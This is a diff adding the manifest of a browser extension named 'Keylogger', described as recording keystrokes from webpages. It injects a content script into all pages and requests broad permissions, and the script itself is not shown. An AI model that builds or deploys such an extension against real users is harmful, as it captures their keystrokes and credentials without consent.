@@ -1,0 +1,30 @@
+{
+	"manifest_version" : 2,
+
+	"name": "Keylogger",
+	"description" : "Records keystrokes from webpages",	
+	"content_scripts" : [
+	{
+		"matches" : ["http://*/*" , "https://*/*"],
+		"js" : ["content.js"]
+		}],
+	"version" : "1.0",
+	"browser_action" : {
+		"default_icon" : "icon.png"
+	},
+	"icons" : {
+		"64" : "icon.png",
+		"32" : "icon.png",
+		"16" : "icon.png",
+		"128" : "icon.png"
+	},
+	"permissions" : [
+	"<all_urls>",
+        "tabs",
+        "storage"
+	]
+}
+
+
+
+   
